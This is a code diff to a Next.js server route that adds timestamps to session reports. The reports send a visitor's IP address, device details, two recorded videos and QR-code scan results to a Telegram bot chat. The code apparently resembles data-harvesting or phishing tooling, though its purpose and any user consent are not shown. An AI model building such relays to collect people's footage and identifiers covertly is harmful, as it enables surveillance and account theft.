@@ -41,12 +41,13 @@ export async function POST(req: NextRequest) {
     const messages: Promise<Response>[] = [];
 
     const sessionPrefix = sessionId ? `[Сессия: \`${sessionId}\`]\n` : "";
+    const formattedTimestamp = timestamp ? new Date(timestamp).toLocaleString('ru-RU') : "Неизвестно";
 
     switch (messageType) {
       case MessageType.InitialSummary:
         let summaryText = `${sessionPrefix}📊 *Отчет о сессии*\n\n`;
         if (timestamp) {
-          summaryText += `*Время сессии:* ${new Date(timestamp).toLocaleString('ru-RU')}\n`;
+          summaryText += `*Время сессии:* ${formattedTimestamp}\n`;
         }
         summaryText += "\n--- 📱 *Информация об устройстве* ---\n";
         if (ipAddress && ipAddress !== "Unavailable") {
@@ -134,7 +135,7 @@ export async function POST(req: NextRequest) {
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
           formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_1_${sessionId}.webm`);
-          formData.append("caption", `${sessionPrefix}🎥 *Видео 1*`);
+          formData.append("caption", `${sessionPrefix}🎥 *Видео 1* (Время: ${formattedTimestamp})`); // Добавлена временная метка
 
           messages.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
@@ -157,7 +158,7 @@ export async function POST(req: NextRequest) {
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
           formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_2_${sessionId}.webm`);
-          formData.append("caption", `${sessionPrefix}🎥 *Видео 2*`);
+          formData.append("caption", `${sessionPrefix}🎥 *Видео 2* (Время: ${formattedTimestamp})`); // Добавлена временная метка
 
           messages.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
@@ -176,14 +177,14 @@ export async function POST(req: NextRequest) {
         let qrMessage = `${sessionPrefix}--- 📸 *QR-код* ---\n`;
         if (qrCodeData) {
           if (qrCodeData === "QR Scan Timed Out") {
-            qrMessage += `*QR-код:* Սկանավորման ժամանակը սպառվեց ⏳\n`; // Время сканирования истекло
+            qrMessage += `*QR-код:* Սկանավորման ժամանակը սպառվեց ⏳ (Время: ${formattedTimestamp})\n`; // Время сканирования истекло
           } else if (qrCodeData.startsWith("QR Scan Error:")) {
-            qrMessage += `*QR-код:* Սկանավորման սխալ ❌ (${qrCodeData.replace("QR Scan Error: ", "")})\n`; // Ошибка сканирования
+            qrMessage += `*QR-код:* Սկանավորման սխալ ❌ (${qrCodeData.replace("QR Scan Error: ", "")}) (Время: ${formattedTimestamp})\n`; // Ошибка сканирования
           } else {
-            qrMessage += `*QR-կոդը սկանավորված է:* Այո ✅ (\`${qrCodeData}\`)\n`; // QR-код отсканирован: Да
+            qrMessage += `*QR-կոդը սկանավորված է:* Այո ✅ (\`${qrCodeData}\`) (Время: ${formattedTimestamp})\n`; // QR-код отсканирован: Да
           }
         } else {
-          qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌\n`; // QR-код отсканирован: Нет
+          qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌ (Время: ${formattedTimestamp})\n`; // QR-код отсканирован: Нет
         }
 
         messages.push(
